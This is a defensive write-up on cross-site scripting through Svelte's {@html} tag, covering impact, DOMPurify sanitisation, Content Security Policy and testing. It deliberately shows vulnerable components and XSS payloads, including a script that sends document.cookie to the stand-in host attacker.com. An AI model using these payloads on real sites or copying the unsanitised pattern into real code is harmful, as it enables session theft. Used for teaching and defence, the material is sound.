# Deep Analysis of Svelte `{@html}` Injection Attack

## 1. Define Objective, Scope, and Methodology

**Objective:** To thoroughly analyze the risk, impact, and mitigation strategies associated with injecting malicious code into Svelte's `{@html}` tag, specifically focusing on the scenario where unsanitized user input is passed to this tag.  This analysis aims to provide actionable recommendations for developers to prevent Cross-Site Scripting (XSS) vulnerabilities.

**Scope:**

*   **Target:** Svelte applications utilizing the `{@html}` tag.
*   **Vulnerability:** Cross-Site Scripting (XSS) via unsanitized input to `{@html}`.
*   **Focus:**  The specific attack path:  `3. Inject into {@html} -> 3a. Unsanitized Input to {@html}`.
*   **Exclusions:**  Other potential XSS vectors in Svelte (e.g., vulnerabilities in third-party libraries, server-side rendering issues not directly related to `{@html}`).  We are focusing solely on the client-side, `{@html}`-specific vulnerability.

**Methodology:**

1.  **Vulnerability Analysis:**  Deep dive into the mechanics of the vulnerability, explaining *why* and *how* it works.

6.  **Residual Risk Assessment:**  Discuss any remaining risks even after implementing mitigations.

## 2. Deep Analysis of Attack Tree Path: 3a. Unsanitized Input to `{@html}`

### 2.1 Vulnerability Analysis

Svelte's `{@html}` tag is a powerful feature that allows developers to render raw HTML strings directly into the DOM.  This is inherently dangerous because it bypasses Svelte's built-in escaping mechanisms, which are designed to prevent XSS.  When user-provided data is directly inserted into `{@html}` without proper sanitization, it creates a direct pathway for attackers to inject malicious HTML and JavaScript.

The core problem is the trust placed in the input.  `{@html}` *assumes* the provided string is safe HTML.  If an attacker can control this string, they control the rendered HTML, and therefore, they can inject arbitrary JavaScript.  This JavaScript then executes in the context of the victim's browser, granting the attacker access to the victim's session, cookies, and potentially the ability to perform actions on behalf of the victim.

### 2.2 Attack Scenario Elaboration

Let's expand on the provided scenario with more concrete examples:

**Example 1: Comment Section**

```svelte
<script>
  let comments = [
    { id: 1, text: "Great article!" },
    { id: 2, text: "<img src=x onerror='alert(\"XSS!\");'>" }, // Malicious comment
    { id: 3, text: "Thanks for sharing." }
  ];
</script>

{#each comments as comment}
  <div class="comment">
    {@html comment.text}  </div>
{/each}
```

In this example, the attacker submits a comment containing an `<img>` tag with an invalid `src` attribute.  The `onerror` event handler is triggered, executing the `alert("XSS!");` JavaScript code.  This demonstrates a simple, yet effective, XSS payload.

**Example 2: Profile Description**

```svelte
<script>
  let userProfile = {
    name: "John Doe",
    description: "<script>document.location='https://attacker.com/steal-cookies?cookie='+document.cookie</script>" // Malicious description
  };
</script>

<h2>{userProfile.name}</h2>
<p>{@html userProfile.description}</p>
```

Here, the attacker injects a `<script>` tag directly into their profile description.  This script redirects the victim's browser to a malicious site, sending the victim's cookies as a URL parameter.  This allows the attacker to hijack the victim's session.

**Example 3:  Hidden Input Manipulation**

Even if the application doesn't directly display user input with `{@html}`, an attacker might manipulate hidden input fields or URL parameters that are later used in `{@html}`.  For instance:

```svelte
<script>
  let hiddenData = new URLSearchParams(window.location.search).get('data'); // Get data from URL
</script>

{#if hiddenData}
  <div>{@html hiddenData}</div>
{/if}
```

If an attacker crafts a URL like `https://example.com/?data=<script>alert(1)</script>`, the malicious script will be executed.

### 2.3 Impact Assessment

The impact of a successful `{@html}` XSS attack can range from minor annoyance to severe security breaches:

*   **Low Impact:**  Displaying unwanted pop-up messages (e.g., `alert(1)`).
*   **Medium Impact:**  Defacing the website, injecting unwanted content, or redirecting users to other (potentially phishing) sites.
*   **High Impact:**
    *   **Session Hijacking:** Stealing session cookies, allowing the attacker to impersonate the victim.
    *   **Data Theft:** Accessing and exfiltrating sensitive data from the application or the user's browser (e.g., local storage, form data).
    *   **Keylogging:**  Capturing user keystrokes, including passwords and credit card information.
    *   **Phishing:**  Displaying fake login forms to steal credentials.
    *   **Drive-by Downloads:**  Silently downloading and executing malware on the victim's machine (though this is less common with modern browser security).
    *   **Client-Side Denial of Service:**  Crashing the user's browser or making the application unusable.
    *   **Worm Propagation:**  If the XSS is stored (e.g., in a comment), it can spread to other users who view the compromised content.

### 2.4 Mitigation Strategy Deep Dive

Let's examine the mitigation strategies in detail:

**1. Avoid `{@html}` Whenever Possible (Preferred)**

This is the most secure approach.  Svelte's templating system (using curly braces `{}`) automatically escapes output, preventing XSS.  Instead of:

```svelte
{@html userProvidedContent}
```

Use:

```svelte
{userProvidedContent}
```

This will render the content as plain text, preventing any HTML tags or JavaScript from being executed.  If you need to display *some* HTML, consider creating a custom component that selectively renders only the safe parts.

**2. Use a Robust HTML Sanitizer (If `{@html}` is Necessary)**

If you absolutely *must* use `{@html}` (e.g., for rendering rich text from a trusted editor), use a well-vetted HTML sanitization library like **DOMPurify**.

*   **Installation:** `npm install dompurify`
*   **Usage:**

```svelte
<script>
  import DOMPurify from 'dompurify';

  let dirtyHTML = '<img src=x onerror=alert(1)> <p>Some text</p>';
  let cleanHTML = DOMPurify.sanitize(dirtyHTML);
</script>

{@html cleanHTML}
```

*   **Configuration:** DOMPurify is highly configurable.  You should *restrict* the allowed tags and attributes to the absolute minimum necessary.  For example:

```javascript
let cleanHTML = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'], // Only allow these tags
  ALLOWED_ATTR: ['href'] // Only allow the 'href' attribute (for links)
});
```

**Crucially, test your DOMPurify configuration thoroughly.**  Use a variety of XSS payloads to ensure it's effectively blocking malicious code.  Regularly update DOMPurify to the latest version to benefit from security patches.

**3. Content Security Policy (CSP)**

CSP is a browser security mechanism that allows you to define a whitelist of sources from which the browser is allowed to load resources (scripts, stylesheets, images, etc.).  A well-configured CSP can significantly mitigate the impact of XSS, even if a vulnerability exists.

*   **Implementation:** CSP is typically implemented via an HTTP response header:

    ```http
    Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;
    ```

    This example allows scripts to be loaded only from the same origin (`'self'`) and from `https://cdn.example.com`.  It also restricts all other resources (images, styles, etc.) to the same origin.

*   **`script-src` Directive:** The `script-src` directive is most relevant to XSS.  Avoid using `'unsafe-inline'` (which allows inline scripts) and `'unsafe-eval'` (which allows `eval()` and similar functions).  Use nonces or hashes for inline scripts if absolutely necessary.

*   **Report-Only Mode:**  Use `Content-Security-Policy-Report-Only` during development to test your CSP without blocking resources.  This will send reports to a specified URL when violations occur.

**4. Input Validation**

While sanitization is the primary defense, input validation is a valuable secondary measure.  Validate user input to ensure it conforms to expected formats, lengths, and character sets.  For example:

*   **Length Limits:**  Restrict the maximum length of input fields to prevent excessively long payloads.
*   **Character Restrictions:**  If a field should only contain alphanumeric characters, enforce that restriction.
*   **Regular Expressions:**  Use regular expressions to validate input against specific patterns.

Input validation can help prevent some attacks, but it should *never* be relied upon as the sole defense against XSS.  Attackers can often bypass input validation rules.

### 2.5 Testing and Verification

Thorough testing is essential to ensure the effectiveness of your mitigations:

*   **Unit Tests:**  Write unit tests that specifically target the `{@html}` rendering logic with various XSS payloads.  Assert that the output is properly sanitized.
*   **Integration Tests:**  Test the entire flow of user input, from submission to rendering, to ensure that no vulnerabilities exist in the interaction between different components.
*   **Manual Penetration Testing:**  Attempt to manually exploit the application using common XSS techniques.  Try different browsers and devices.
*   **Automated Security Scanners:**  Use automated web application security scanners (e.g., OWASP ZAP, Burp Suite) to identify potential XSS vulnerabilities.
*   **Code Review:**  Have another developer review your code, paying close attention to any use of `{@html}`.

### 2.6 Residual Risk Assessment

Even with all the mitigations in place, some residual risk may remain:

*   **Zero-Day Vulnerabilities:**  New vulnerabilities in sanitization libraries or browsers could be discovered.  Regularly update your dependencies and monitor security advisories.
*   **Misconfiguration:**  Incorrectly configured sanitizers or CSP rules can leave the application vulnerable.  Thorough testing and review are crucial.
*   **Complex Interactions:**  Complex interactions between different parts of the application could introduce unforeseen vulnerabilities.
*   **Server-Side Issues:** While this analysis focuses on client-side `{@html}` vulnerabilities, server-side issues (e.g., reflected XSS) could still exist.

By implementing the recommended mitigations and maintaining a strong security posture, you can significantly reduce the risk of XSS vulnerabilities related to Svelte's `{@html}` tag. Continuous monitoring, testing, and updating are essential to stay ahead of potential threats.
